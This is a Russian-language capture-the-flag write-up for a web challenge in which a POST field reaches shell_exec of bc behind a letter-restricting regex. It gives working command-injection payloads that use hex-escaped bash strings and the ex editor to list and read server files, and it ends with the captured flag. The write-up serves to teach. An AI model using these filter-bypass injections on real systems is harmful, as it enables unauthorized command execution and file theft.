BC (CTB 100)
=======
У нас есть онлайн калькулятор командной строки для Linux(https://hy17-bc.spb.ctf.su/)

Так же имеем исходный код страницы(https://hy17-bc.spb.ctf.su/?source), где мы передаем POST параметр `$expr`в
```php
shell_exec("bc 2>&1 <<<'$expr'")
```
Но есть проблема, перед тем как выполнить код выше, наш запрос проходит через регулярное выражение
```php
if (preg_match('#[g-wy-z]#si', $expr))
```
Которое гласит, что нам можно использовать только `[abcdefx]` и любые символы пунктуцации

Я очень долго искал решение к этому заданию, и пришел к такому выводу
```
';ex +%$'\x70' -$'\x73\x63\x71'! -c *;'
```
В нормальном виде выглядит так
```
';ex +%p -scq! -c *;'
```
`ex` - это текстовый редактор linux в котором можно выполнять команды bash как в vim

Я говорю ему прочитать все, что есть в первом попавшемся файле в директории и перенаправляю вывод в командную строку

Сделать так, что бы читались сразу все файлы в один вывод, пока не получилось

Перед там как написать свой Write-up, я глянул чужие работы и понял, что я сильно заморачивался и можно было так
```
';xxd f*;'
```
Обидно то, что вокруг этой команды я плясал оочень долго:D

Дополнение:

Исходя из выше написанного я пришел к выводу, что можно было сделать так...

Получаем список файлов `';ls;'`
```
';$'\x6C\x73';'
```
```
Output:
bc.html
flag.txt
index.php
```
Исходя из того, что `';cat flag.txt;'` не работает

Делаем так
```
';ex $'\x66\x6C\x61\x67\x2E\x74\x78\x74' +%$'\x70' -$'\x73\x63\x71'!;'
```

И собственно флаг
> hy17{9edd3d10987207dc1f97a9bfc6af269f}
